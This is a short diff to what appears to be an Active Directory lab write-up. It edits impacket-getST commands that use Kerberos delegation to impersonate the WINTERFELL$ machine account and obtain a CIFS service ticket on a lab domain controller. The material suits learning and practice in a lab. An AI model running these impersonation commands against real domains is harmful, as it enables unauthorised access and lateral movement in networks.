@@ -76,7 +76,15 @@ We can see that the user of the `WINTERFELL` machine is `WINTERFELL$` so this is
       -altservice HOST/winterfell.north.sevenkingdoms.local \
       -impersonate WINTERFELL$ \
       north.sevenkingdoms.local/jon.snow \
-      -k -dc-ip 10.2.10.11
+      -dc-ip 10.2.10.11
+```
+```bash
+
+  impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
+      -impersonate WINTERFELL$ \
+      north.sevenkingdoms.local/jon.snow \
+      -dc-ip 10.2.10.11
+
 ```
 
 We are prompted with the `jon.snow` password and successfully get the ST for the `WINTERFELL$` account.
